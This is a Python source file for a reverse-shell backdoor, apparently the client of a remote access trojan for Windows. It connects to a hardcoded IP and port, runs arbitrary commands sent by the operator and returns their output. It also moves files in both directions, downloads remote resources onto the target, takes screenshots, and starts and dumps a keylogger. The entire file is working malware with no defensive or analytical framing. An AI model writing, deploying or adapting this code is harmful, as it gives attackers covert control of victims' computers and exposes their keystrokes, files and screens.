#!/usr/bin/python3
import socket
import subprocess
import json
import base64
import os
import json
import shutil
import sys
import time
import requests
from mss import mss
import threading
import log


def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get("SystemRoot", 'C:\Windows'), 'temp']))
    except:
        admin = '[!!] User level'
    else:
        admin = '[+] Admin Level'


def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download_url(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as file:
        file.write(get_response.content)


def connection():
    while True:
        time.sleep(2)
        try:
            sock.connect(("192.168.154.127", 54321))
            shell()
        except:
            connection()


def reliable_send(data):
    data = (data).decode('utf-8')
    json_data = json.dumps(data)
    sock.send(json_data.encode('utf-8'))


def reliable_recv():
    data = " "
    while True:
        try:
            data = data + (sock.recv(1024)).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            continue
        elif command == 'exit':
            break
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True)
        elif command == 'help':
            help_options = '''
                    download <path>  ==> Download a file from the target
                    upload <path>    ==> Upload a file from target PC
                    get <url>        ==> Download a resource from website on target PC
                    start <path>     ==> Start an application program on target PC
                    screenshot       ==> Takes Screenshot on target PC
                    check            ==> Checks for the level of privilege we have on target PC
                    exit            ==>  Close the connection
                    '''
            reliable_send((help_options).encode('utf-8'))
        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:6] == 'upload':
            with open(command[7:], 'w') as file:
                file_data = reliable_recv()
                file.write(file_data)
                file.close()
        elif command[:8] == 'download':
            with open(command[9:], 'rb')as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:3] == 'get':
            try:
                download_url(command[4:])
                reliable_send(("[+] Resource Downloaded Successfully").encode('utf-8'))
            except:
                reliable_send(("[-] Resource Downloaded Failed").encode('utf-8'))
        elif command[:10] == 'screenshot':
            try:
                screenshot()
                with open('monitor-1.png', 'rb') as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove('monitor-1.png')
            except:
                reliable_send(('[!!] Failed to take the screenshot').encode('utf-8'))
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send(('[+] Started').encode('utf-8'))
            except:
                reliable_send(('[!!] Falied to start').encode('utf-8'))
        elif command[:12] == 'keylog_start':
            try:
                t1 = threading.Thread(target=log.start)
                t1.start()
            except:
                reliable_send(("Failed to start").encode('utf-8'))
        elif command[:11] == 'keylog_dump':
            try:
                path = os.environ['appdata'] + '\\process.txt'
                #path = '/root/process.txt'
                fn = open(path, 'r')
                reliable_send((fn.read()).encode('utf-8'))
            except:
                reliable_send(("Failed to read data from file").encode('utf-8'))
        elif command[:5] == 'check':
            is_admin()
            reliable_send((admin).encode('utf-8'))
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
